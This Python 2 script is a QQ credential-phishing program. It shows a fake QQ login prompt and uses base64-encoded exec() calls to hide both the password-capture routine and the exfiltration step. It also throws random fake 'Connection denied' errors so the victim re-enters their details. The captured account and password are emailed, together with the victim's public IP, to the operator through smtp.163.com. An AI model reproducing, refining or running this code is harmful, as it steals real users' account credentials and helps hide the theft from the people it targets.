from smtplib import SMTP_SSL
import base64
from email.mime.text import MIMEText
import random
import urllib2
import re
import os
import time
o = os.system('clear')
dwp = base64.b64decode('')
resu = base64.b64decode('')
print "-----QQ-----"
def get_ip():
    html = urllib2.urlopen('http://1212.ip138.com/ic.asp').read()
    ip=re.findall('\d{1,3}.\d{1,3}.\d{1,3}.\d{1,3}',html)
    return ip[0]


def make_msg(a,p,ip):
    account = "account:%s\npassword:%s"%(a,p)
    msg = MIMEText(account,'plain','utf-8')
    msg['Subject'] = 'Title'
    msg['From'] = ip
    msg['To'] = 'me'
    return msg

exec(base64.b64decode('ZGVmIHNob3coKToKICAgIHdoaWxlIFRydWU6CiAgICAgICAgdHJ5OgogICAgICAgICAgICBhID0gcmF3X2lucHV0KGJhc2U2NC5iNjRkZWNvZGUoJ1VHeGxZWE5sSUdWdWRHVnlJSGx2ZFhJZ1VWRWdZV05qYjNWdWREbz0nKSkKICAgICAgICAgICAgYV90ID0gaW50KGEpCiAgICAgICAgZXhjZXB0IFZhbHVlRXJyb3I6CiAgICAgICAgICAgIHByaW50IGJhc2U2NC5iNjRkZWNvZGUoJ1RYVnpkQ0JpWlNCdWRXMWlaWEloJykKICAgICAgICAgICAgY29udGludWUKICAgICAgICBiID0gcmF3X2lucHV0KGJhc2U2NC5iNjRkZWNvZGUoJ1VHeGxZWE5sSUdWdWRHVnlJSGx2ZFhJZ2NHRnpjM2R2Y21RNicpKQogICAgICAgIGlmIGFfdCA8IDEwMDAwMCBvciBhX3QgPiA5OTk5OTk5OTk5OgogICAgICAgICAgICBwcmludCBiYXNlNjQuYjY0ZGVjb2RlKCdJRlJvYVhNZ1lXTmpiM1Z1ZENCa2IyVnpJRzV2ZENCbGVHbHpkQ0FoJykKICAgICAgICAgICAgY29udGludWUKICAgICAgICBicmVhawogICAgcmV0dXJuIGEsYg=='))

while True:
    a,b = show()
    if len(b) < 6:
        print base64.b64decode("UGFzc3dvcmQgaXMgd3Jvbmch")
        print base64.b64decode('Q29ubmVjdGlvbiBkZW5pZWQhUGxlYXNlIEVudGVyIGFnYWluLg==')
        time.sleep(5)
        os.system('clear')
        continue
    if random.random() > 0.5:
        print base64.b64decode('Q29ubmVjdGlvbiBkZW5pZWQhUGxlYXNlIEVudGVyIGFnYWluLg==')
        time.sleep(5)
        os.system('clear')
        continue
    break
    
exec(base64.b64decode('cyA9IFNNVFBfU1NMKCdzbXRwLjE2My5jb20nKQpzLmxvZ2luKHJlc3UsZHdwKQptc2cgPSBtYWtlX21zZyhiLGEsZ2V0X2lwKCkpCnMuc2VuZG1haWwocmVzdSxyZXN1LG1zZy5hc19zdHJpbmcoKSk='))
